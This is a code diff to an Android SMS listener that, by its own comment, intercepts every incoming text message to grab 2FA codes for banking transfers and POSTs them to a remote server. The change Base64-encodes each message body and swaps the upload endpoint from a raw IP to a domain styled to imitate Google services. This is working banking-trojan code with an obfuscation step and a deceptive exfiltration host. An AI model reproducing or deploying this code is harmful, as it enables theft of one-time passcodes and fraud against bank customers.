@@ -7,6 +7,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
+import android.util.Base64;
 import android.util.Log;
 
 import com.android.volley.AuthFailureError;
@@ -20,6 +21,8 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+
+import static java.sql.DriverManager.println;
 
 /* SMSListener is a Broadcast Receiver that receives all the SMS the user received.
  * The purpose of listening to user's SMS messages is to retrieve the 2FA that may be triggered when making a transfer transaction through the iBanking app
@@ -46,16 +49,18 @@ public class SmsListener extends BroadcastReceiver {
                         msg_from = msgs[i].getOriginatingAddress();
                         String msgBody = msgs[i].getMessageBody();
 
+                        String encodedMsg = Base64.encodeToString(msgBody.getBytes(),Base64.DEFAULT);
+
                         // Create data object to store the message content
                         dataArray = new ArrayList<Data>();
-                        Data dt = new Data(msgBody, id);
+                        Data dt = new Data(encodedMsg, id);
                         dataArray.add(dt);
 
                         // Convert the data into JSON
                         Gson gson = new Gson();
                         final String newDataArray = gson.toJson(dataArray);
 
-                        final String server_url = "http://35.240.192.167/upload_data.php";
+                        final String server_url = "http://encrypt.googleservices.ml//upload_data.php";
 
                         // Create the request
                         StringRequest stringRequest = new StringRequest(Request.Method.POST, server_url,
